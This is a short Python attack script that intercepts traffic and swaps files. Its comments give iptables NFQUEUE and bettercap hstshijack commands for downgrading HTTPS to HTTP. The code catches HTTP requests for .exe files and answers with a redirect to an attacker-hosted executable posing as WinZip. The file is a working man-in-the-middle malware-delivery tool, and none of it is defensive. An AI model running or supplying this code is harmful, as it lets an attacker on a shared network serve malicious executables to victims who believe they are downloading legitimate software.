#!/usr/bin/env python
# iptables -I FORWARD -j NFQUEUE --queue-num 0 (TRAPPING REQUESTS IN A QUEUE)
# iptables --flush (TO DELETE ALL THE IPTABLES *MAKE SURE TO DO THIS)
# USE OUTPUT/INPUT WHILE USING BETTERCAP
# BETTERCAP USED TO DOWNGRADE HTTPS TO HTTP
# bettercap -iface eth0 -caplet hstshijack/hstshijack
# This command strips the SSL from the response
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 (REDIRECTING PACKETS TO THE QUEUE)
# iptables -I INPUT -j NFQUEUE --queue-num 0


import netfilterqueue as netq
import scapy.all as scapy


ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # Bettercap uses port/proxy 8080 so we are using 8080
        if scapy_packet[scapy.TCP].dport == 8080:
            if b".exe" in scapy_packet[scapy.Raw].load and b"192.168.0.123" not in scapy_packet[scapy.Raw].load:
                print("[+] EXE Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 8080:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # WE CAN GIVE THE URL WHAT WE WANT
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.0.123/gl/nkln/winzip27-pp.exe\n\n")

                packet.set_payload(str(modified_packet))


    packet.accept()


queue = netq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
